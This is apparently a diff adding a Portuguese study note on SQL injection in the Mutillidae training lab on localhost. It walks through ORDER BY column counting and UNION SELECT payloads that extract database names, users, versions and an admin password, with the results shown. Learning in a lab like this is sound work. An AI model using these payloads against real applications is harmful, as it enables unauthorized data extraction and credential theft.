@@ -1,0 +1,41 @@
+Uma forma de descobrir quantas colunas tem uma tabela é utilizando order by
+
+EX: 
+    Query: select nome from Conta_Usuario order by 4; -> ERRO SQL
+
+http://localhost/mutillidae
+
+Vamos testar:
+    - OWASP 2017 > A1 - Injection(SQL) > SQLi - Extract Data > User Info (SQL)
+
+Na entrada input:
+    teste' ORDER BY 1#
+    teste' ORDER BY 7#
+    teste' ORDER BY 8# --> GERA ERRO
+
+TEMOS ENTÃO 7 COLUNAS
+
+Utilizando o Operador UNION para trazer os dados das COLUNAS.
+admin' UNION SELECT 1,2,3,4,5,6,7#
+
+Com isso serão mostrados 3 colunas
+Username=admin
+Password=adminpass
+Signature=g0t r00t?
+
+Username=2
+Password=3
+Signature=4
+
+
+Vamos usar outras funções para obtér mais dados:
+    database() -> Devolve o nome do banco de dados
+    user()     -> Devolve o nome de usuário usado no banco de dados
+    version()  -> Devolve a versão do banco de dados
+
+Sabemos que as colunas 2,3,4 é as que estão sendo mostradas, com isso, vamos realizar a substituição.
+admin' UNION SELECT 1,database(),user(),version(),5,6,7#
+
+Username=mutillidae
+Password=mutillidae_juvenal@localhost
+Signature=8.0.29-0ubuntu0.20.04.3
